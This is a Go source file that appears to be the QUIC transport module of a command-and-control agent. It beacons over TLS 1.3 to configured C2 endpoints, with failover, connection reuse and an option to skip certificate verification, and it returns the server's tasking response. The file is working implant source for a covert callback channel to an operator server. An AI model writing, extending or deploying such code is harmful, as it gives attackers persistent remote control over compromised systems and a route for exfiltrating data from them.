//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"sync"
	"time"

	"github.com/quic-go/quic-go"
)

const quicMaxBeacon = 16 * 1024 * 1024

var (
	quicMu   sync.Mutex
	quicConn *quic.Conn
	quicAddr string
)

func quicCachedConn(addr string) *quic.Conn {
	quicMu.Lock()
	defer quicMu.Unlock()
	if quicConn == nil || quicAddr != addr {
		return nil
	}
	return quicConn
}

func quicRememberConn(addr string, conn *quic.Conn) {
	quicMu.Lock()
	defer quicMu.Unlock()
	quicAddr = addr
	quicConn = conn
}

func quicInvalidateConn() {
	quicMu.Lock()
	defer quicMu.Unlock()
	if quicConn != nil {
		_ = quicConn.CloseWithError(0, "")
	}
	quicConn = nil
	quicAddr = ""
}

// sendQUICBeacon ships one v2 envelope over a QUIC stream (TLS 1.3). The
// connection is reused across beacons like WSS; a stale/failed connection is
// invalidated and redialed once so a server restart does not require an agent
// restart. Every configured quic:// endpoint is tried in failover order.
func sendQUICBeacon(body []byte) []byte {
	return forEachC2Endpoint("quic", func(_ int, _ string, hostPort, _ string) []byte {
		return sendQUICBeaconAt(hostPort, body)
	})
}

func sendQUICBeaconAt(hostPort string, body []byte) []byte {
	for attempt := 0; attempt < 2; attempt++ {
		conn := quicCachedConn(hostPort)
		fresh := false
		if conn == nil {
			tlsCfg := newAgentTLSConfig("")
			if tlsCfg == nil {
				// #nosec G402 -- SkipTLSVerify is an operator build option; false runs the standard verifier.
				tlsCfg = &tls.Config{InsecureSkipVerify: SkipTLSVerify} // #nosec G402
			}
			tlsCfg.NextProtos = []string{"h3", "fc2"}
			tlsCfg.MinVersion = tls.VersionTLS13 // QUIC requires TLS 1.3.

			ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
			dialed, err := quic.DialAddr(ctx, hostPort, tlsCfg, &quic.Config{
				MaxIdleTimeout:  25 * time.Second,
				KeepAlivePeriod: 10 * time.Second,
			})
			cancel()
			if err != nil {
				if Debug {
					fmt.Printf("[!] QUIC beacon: dial %s failed: %v\n", hostPort, err)
				}
				return nil
			}
			conn = dialed
			quicRememberConn(hostPort, conn)
			fresh = true
		}

		resp, err := quicRoundTrip(conn, body)
		if err == nil {
			return resp
		}
		quicInvalidateConn()
		if Debug {
			fmt.Printf("[!] QUIC beacon attempt %d failed: %v\n", attempt+1, err)
		}
		if fresh {
			return nil // a freshly dialed connection still failed
		}
	}
	return nil
}

func quicRoundTrip(conn *quic.Conn, body []byte) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	stream, err := conn.OpenStreamSync(ctx)
	if err != nil {
		return nil, err
	}
	defer stream.CancelRead(0)
	if _, err := stream.Write(body); err != nil {
		return nil, err
	}
	// Half-close write so the server sees EOF on the request.
	if err := stream.Close(); err != nil {
		return nil, err
	}
	resp, err := io.ReadAll(io.LimitReader(stream, quicMaxBeacon+1))
	if err != nil {
		return nil, err
	}
	if len(resp) == 0 {
		return nil, fmt.Errorf("empty QUIC beacon response")
	}
	if len(resp) > quicMaxBeacon {
		return nil, fmt.Errorf("QUIC response exceeds %d bytes", quicMaxBeacon)
	}
	return resp, nil
}
